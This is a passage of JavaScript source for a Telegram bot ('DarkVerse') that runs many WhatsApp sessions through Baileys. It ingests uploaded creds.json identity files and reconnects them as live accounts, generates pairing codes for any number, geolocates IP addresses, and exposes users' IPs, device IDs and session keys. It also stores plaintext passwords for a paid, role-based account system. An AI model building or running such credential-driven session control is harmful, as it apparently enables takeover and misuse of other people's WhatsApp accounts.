          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            if (fs.existsSync(folderPath)) {
              fs.rmSync(folderPath, { recursive: true, force: true });
            }
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            if (fs.existsSync(folderPath)) {
              fs.rmSync(folderPath, { recursive: true, force: true });
            }
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
      return false;
  }
  const sessionDir = path.join('permenmd', owner, number); 

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd', { recursive: true });
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

try {
  await waiting(3000)
  if (fs.existsSync(sourceCreds)) {
    const data = fs.readFileSync(sourceCreds); // baca isi file sumber
    fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
    console.log(`✅ Rewrote session to ${destCreds}`);
  }
} catch (e) {
  console.error(`❌ Failed to rewrite creds: ${e.message}`);
}
    }
  });

  return null;
}

async function startUserSessions() {
  try {
    // Ensure base folder exists
    if (!fs.existsSync('permenmd')) {
      fs.mkdirSync('permenmd', { recursive: true });
    }

    // Create public_senders folder if not exists
    const publicSendersDir = path.join('permenmd', 'public_senders');
    if (!fs.existsSync(publicSendersDir)) {
      fs.mkdirSync(publicSendersDir, { recursive: true });
    }

    // Ambil semua subfolder dalam permenmd
    const subfolders = fs.readdirSync('permenmd')
      .map(name => path.join('permenmd', name))
      .filter(p => {
        try {
          return fs.lstatSync(p).isDirectory();
        } catch (err) {
          return false;
        }
      });

    console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

    for (const folder of subfolders) {
      try {
        const jsonFiles = fs.readdirSync(folder)
          .filter(file => file.endsWith(".json"))
          .map(file => path.join(folder, file));

        console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

        for (const jsonFile of jsonFiles) {
          const sessionName = path.basename(jsonFile, ".json");

          // ✅ Cek apakah session sudah aktif
          if (activeConnections[sessionName]) {
            console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
            continue;
          }

          try {
            console.log(`[START] Connecting session: ${sessionName}`);
            await connectSession(folder, sessionName);
          } catch (err) {
            console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
          }
        }
      } catch (err) {
        console.error(`Error processing folder ${folder}:`, err.message);
      }
    }
  } catch (err) {
    console.error("Error in startUserSessions:", err.message);
  }
}

// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  try {
    const folderPath = path.join('permenmd', subfolderName);
    if (!fs.existsSync(folderPath)) return null;

    const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
    for (const file of jsonFiles) {
      const sessionName = `${path.basename(file, ".json")}`;
      if (activeConnections[sessionName]) {
        return activeConnections[sessionName]; // return socket aktif
      }
    }
    return null; // Tidak ada sesi aktif
  } catch (err) {
    console.error("Error checking active session:", err.message);
    return null;
  }
}

const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [[
          { text: "📋 List User", callback_data: "list_user" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom" },
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu getPublicSenders,addPublicSender,deletePublicSender:`, options);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
  await refreshUserSessions()
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
})

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  
  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  const onlineMess = connectedMess || [];
  const onlineBiz = connectedBiz || [];
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += onlineMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += onlineBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += onlineNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

// ===== HANDLER CALLBACK UNTUK APPROVE/REJECT TOP UP =====
bot.on("callback_query", async (query) => {
  const data = query.data;
  const fromId = query.from.id;
  const chatId = query.message.chat.id;

  // Handle approve top up
  if (data.startsWith("approve_")) {
    if (fromId !== OWNER_ID) {
      return bot.answerCallbackQuery(query.id, { 
        text: "❌ Kamu tidak memiliki izin untuk ini.", 
        show_alert: true 
      });
    }

    const requestId = data.replace("approve_", "");
    const topupRequests = loadTopupRequests();
    const request = topupRequests.find(r => r.requestId === requestId && r.status === "pending");

    if (!request) {
      bot.answerCallbackQuery(query.id, { 
        text: "❌ Request ID tidak ditemukan atau sudah diproses.", 
        show_alert: true 
      });
      return bot.editMessageText(
        `❌ *Request ID: ${requestId}*\n\nRequest tidak ditemukan atau sudah diproses sebelumnya.`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "Markdown"
        }
      );
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === request.username);

    if (!user) {
      bot.answerCallbackQuery(query.id, { 
        text: "❌ User tidak ditemukan di database.", 
        show_alert: true 
      });
      return bot.editMessageText(
        `❌ *Request ID: ${requestId}*\n\nUser ${request.username} tidak ditemukan di database.`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "Markdown"
        }
      );
    }

    if (user.coins === undefined) user.coins = 0;
    
    const oldCoins = user.coins;
    user.coins += request.amount;
    saveDatabase(db);

    request.status = "approved";
    request.processedAt = new Date().toISOString();
    request.processedBy = query.from.username || query.from.first_name;
    saveTopupRequests(topupRequests);

    bot.editMessageText(
      `✅ *Top Up Berhasil Diproses*\n\n📋 Request ID: \`${requestId}\`\n👤 Username: ${user.username}\n💰 Coin: ${oldCoins} → ${user.coins} (+${request.amount})\n✓ Status: Approved\n👮 Diproses oleh: ${request.processedBy}\n⏰ Waktu: ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: "Markdown"
      }
    );

    bot.answerCallbackQuery(query.id, { text: "✅ Top up berhasil diproses!", show_alert: false });

    if (request.userId) {
      try {
        bot.sendMessage(request.userId, `✅ *Top Up Berhasil!*\n\n📋 Request ID: \`${requestId}\`\n💰 Jumlah: +${request.amount} coins\n💳 Saldo: ${oldCoins} → ${user.coins}\n\nTerima kasih telah melakukan top up!`, { parse_mode: "Markdown" });
      } catch (err) {
        console.log("Gagal kirim notifikasi ke user:", err.message);
      }
    }

    sendToGroupsUtama(`✅ *Top Up Berhasil*\n\n📋 Request ID: \`${requestId}\`\n👤 Username: ${user.username}\n💰 Jumlah: ${request.amount} coins\n💳 Saldo: ${oldCoins} → ${user.coins}\n👮 Diproses oleh: ${request.processedBy}\n⏰ Waktu: ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}`, { parse_mode: "Markdown" });

    const logLine = `${new Date().toISOString()} | TOPUP | ${request.processedBy} approved ${request.amount} coins for ${user.username} | Balance: ${oldCoins} → ${user.coins}\n`;
    fs.appendFileSync('logTopup.txt', logLine);
  }

  // Handle reject top up
  if (data.startsWith("reject_")) {
    if (fromId !== OWNER_ID) {
      return bot.answerCallbackQuery(query.id, { 
        text: "❌ Kamu tidak memiliki izin untuk ini.", 
        show_alert: true 
      });
    }

    const requestId = data.replace("reject_", "");
    const topupRequests = loadTopupRequests();
    const request = topupRequests.find(r => r.requestId === requestId && r.status === "pending");

    if (!request) {
      bot.answerCallbackQuery(query.id, { 
        text: "❌ Request ID tidak ditemukan atau sudah diproses.", 
        show_alert: true 
      });
      return bot.editMessageText(
        `❌ *Request ID: ${requestId}*\n\nRequest tidak ditemukan atau sudah diproses sebelumnya.`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "Markdown"
        }
      );
    }

    request.status = "rejected";
    request.processedAt = new Date().toISOString();
    request.processedBy = query.from.username || query.from.first_name;
    saveTopupRequests(topupRequests);

    bot.editMessageText(
      `❌ *Top Up Ditolak*\n\n📋 Request ID: \`${requestId}\`\n👤 Username: ${request.username}\n💰 Jumlah: ${request.amount} coins\n✗ Status: Rejected\n👮 Ditolak oleh: ${request.processedBy}\n⏰ Waktu: ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: "Markdown"
      }
    );

    bot.answerCallbackQuery(query.id, { text: "❌ Top up telah ditolak.", show_alert: false });

    if (request.userId) {
      try {
        bot.sendMessage(request.userId, `❌ *Top Up Ditolak*\n\n📋 Request ID: \`${requestId}\`\n💰 Jumlah: ${request.amount} coins\n\nRequest top up kamu telah ditolak. Silakan hubungi admin untuk informasi lebih lanjut.`, { parse_mode: "Markdown" });
      } catch (err) {
        console.log("Gagal kirim notifikasi ke user:", err.message);
      }
    }

    sendToGroupsUtama(`❌ *Top Up Ditolak*\n\n📋 Request ID: \`${requestId}\`\n👤 Username: ${request.username}\n💰 Jumlah: ${request.amount} coins\n👮 Ditolak oleh: ${request.processedBy}\n⏰ Waktu: ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}`, { parse_mode: "Markdown" });

    const logLine = `${new Date().toISOString()} | TOPUP | ${request.processedBy} rejected ${request.amount} coins for ${request.username}\n`;
    fs.appendFileSync('logTopup.txt', logLine);
  }
}); // ✅ TUTUP HANDLER APPROVE/REJECT

// ===== HANDLER CALLBACK UNTUK MENU BOT =====
bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:\n👤 Username: ${username}\n🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*\n${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:\n👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
}); 

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://localhost:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*DarkVerse Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Darkness-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

bot.onText(/\/pairing (.+)/, async (msg, match) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const number = match[1];

  // Validasi format nomor
  if (!number || !number.match(/^\d+$/)) {
    return bot.sendMessage(chatId, "⚠️ Usage: /pairing <number>\nContoh: /pairing 6281234567890");
  }

  // Cek apakah user adalah VIP atau Owner
  const db = loadDatabase();
  const user = db.find(u => u.username === userId.toString());
  
  if (!user || !["vip", "owner"].includes(user.role)) {
    return bot.sendMessage(chatId, "❌ Command ini hanya untuk role VIP dan Owner!");
  }

  try {
    // Generate pairing code untuk nomor tersebut
    const sessionDir = path.join('permenmd', userId.toString(), number);
    
    if (!fs.existsSync(sessionDir)) {
      fs.mkdirSync(sessionDir, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    });

    sock.ev.on("creds.update", saveCreds);

    // Request pairing code
    await waiting(1000);
    let code = await sock.requestPairingCode(number);
    
    if (code) {
      bot.sendMessage(chatId, `✅ Pairing code untuk ${number}: \`${code}\`\n\nGunakan kode ini di WhatsApp untuk pairing.`, { parse_mode: "Markdown" });
    } else {
      bot.sendMessage(chatId, "❌ Gagal mendapatkan pairing code. Nomor ini mungkin sudah terdaftar.");
    }

    // Tutup koneksi sementara
    setTimeout(() => {
      sock.ws.close();
    }, 30000); // Tutup setelah 30 detik

  } catch (err) {
    console.error("❌ Error pairing:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat generate pairing code.");
  }
});

// === Fitur Track IP ===
bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    // Kirim peta lokasi (jika ada koordinat)
    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

// ===== Fitur reset akun by role =====
// Usage:
// 1) /resetakunmember        -> bot akan menanyakan konfirmasi
// 2) /resetakunmember yes    -> konfirmasi, lalu hapus semua akun role 'member'
// Sama untuk: resetakunowner, resetakunreseller, resetakunvip
// Untuk hapus semua akun: /resetall yes
// NOTE: hanya telegram owner (config.ownerList) yang boleh menjalankan.
// === FITUR RESET AKUN DENGAN BUTTON KONFIRMASI (HANYA ID KAMU) ===
// 🔐 Ganti dengan ID Telegram kamu

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}

function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

// 🔧 Fungsi utama hapus akun
function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

// 🔘 Command reset dengan tombol konfirmasi
function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  // Handle klik tombol konfirmasi
  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

// 🔹 Daftarkan semua perintah
registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

// === FITUR /INFO <username> ===
bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    // cari data akun
    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    // ambil data dari database.json
    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    // ambil data dari keyList.json
    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// === FITUR /STATS - STATUS BOT & USER ===
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    // === Load database user ===
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    // === Cek session WhatsApp aktif (jika pakai Baileys MD) ===
